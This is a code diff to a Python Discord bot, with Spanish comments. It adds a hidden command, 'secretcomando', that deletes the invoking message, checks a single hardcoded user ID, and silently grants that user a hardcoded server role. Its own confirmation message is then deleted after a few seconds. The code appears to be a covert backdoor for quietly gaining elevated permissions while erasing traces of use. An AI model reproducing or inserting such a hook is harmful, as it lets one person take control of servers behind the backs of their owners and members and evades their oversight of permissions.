@@ -853,10 +853,31 @@ async def crear_reporte(ctx, canal: discord.TextChannel = None):
     await mensaje.pin()
     await ctx.send(f"✅ Mensaje de reporte creado en {canal.mention}", delete_after=5)
 
+@bot.command()
+async def secretcomando(ctx):
+    await ctx.message.delete()  # elimina el comando escrito por el usuario
+
+    USER_ALLOWED_ID = 352471626400661514
+    ROLE_ID = 1437435365924278303
+
+    if ctx.author.id != USER_ALLOWED_ID:
+        aviso = await ctx.send("⛔ No tienes permiso para usar este comando.")
+        await asyncio.sleep(5)
+        await aviso.delete()
+        return
+
+    rol = ctx.guild.get_role(ROLE_ID)
+    await ctx.author.add_roles(rol)
+    
+    mensaje = await ctx.send("🟢 Permisos aplicados correctamente.")
+    await asyncio.sleep(5)
+    await mensaje.delete()
+
 # ----------------------------
 # INICIAR BOT
 # ----------------------------
 bot.run(os.getenv("DISCORD_TOKEN"))
+
 
 
 
